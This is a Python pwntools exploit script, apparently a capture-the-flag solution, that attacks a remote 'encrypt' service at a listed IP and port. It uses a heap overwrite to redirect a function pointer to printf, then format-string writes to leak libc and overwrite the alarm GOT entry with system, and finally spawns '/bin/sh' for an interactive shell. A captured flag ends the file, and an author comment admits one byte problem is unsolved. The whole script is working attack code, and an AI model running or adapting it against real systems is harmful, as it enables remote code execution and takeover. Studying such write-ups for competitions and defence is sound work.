from pwn import *

# p = process('./encrypt')
p = remote('101.200.187.112',9005)
context(log_level="debug")
m_size = 0x68
elf = ELF('encrypt')
printf_plt = elf.symbols['printf']
alarm_plt =  elf.symbols['alarm']
puts_got = elf.got['puts']
alarm_got = elf.got['alarm']
may_system_offset = [-0x7b220,-0x7a690]

def add(content,mod):
	p.recvuntil('. Exit.\n')
	p.sendline('1')
	p.recvuntil('message : ')
	p.sendline(content)
	p.recvuntil('No,2.Xor):')
	p.sendline(str(mod))
	p.recvuntil('Message successfully created!\n')
def edit(content,id):
	p.recvuntil('. Exit.\n')
	p.sendline('3')
	p.recvuntil('message id :')
	p.sendline(str(id))
	p.recvuntil('message :')
	p.sendline(content)
	p.recvuntil('Edit successfully!\n')
def enc(id):
	p.recvuntil('. Exit.\n')
	p.sendline('2')
	p.recvuntil('message id :')
	p.sendline(str(id))
	p.recvuntil('Encrypting your message...\n')
	data = p.recvuntil('Encrypt finished!\n')
	return data[0:6]+"\x00\x00"
def enc2(id):
	p.recvuntil('. Exit.\n')
	p.sendline('2')
	p.recvuntil('message id :')
	p.sendline(str(id))
	p.recvuntil('Encrypt finished!\n')
def fmt(str,addr):
	payload2 = str+'\x00'*(0x50-len(str))+p64(addr)
	edit(payload2,2)
	return u64(enc(2))
def fmt2(str,addr):
	payload2 = str+'\x00'*(0x50-len(str))+p64(addr)
	edit(payload2,2)
	enc2(2)
add('a','2')#3
add('b','2')#2
add('c','2')#1
add('d','2')#0
# gdb.attach(p,'b*0x400BA6\nc\nx/4xw 0x6020B0')
payload1 = 'a'*0x50+p64(0x1)+p32(0x71)+p32(0)+p64(printf_plt)
edit(payload1,3)

# fmt('%s',puts_got)
alarm_libc = fmt('%s',alarm_got)
system_libc = alarm_libc+may_system_offset[1]
for i in range(6):
	l = (system_libc >> (i*8))&0xff
	fmt2("%%%dc%%hhn"%(l),alarm_got+i)
payload1 = 'a'*0x56+p64(0x1)+p32(0x71)+p32(0)+p64(alarm_plt)##0x56 is '\n'(0x0a) cover the addr!,now I can't solve it .
edit(payload1,3)
payload2 = "/bin/sh\x00"
edit(payload2,2)


p.recvuntil('. Exit.\n')
p.sendline('2')
p.recvuntil('message id :')
p.sendline('2')
p.recvuntil('Encrypting your message...\n')
p.interactive()

#flag{4c829d1c28a974b06a845826d8e3f8a2}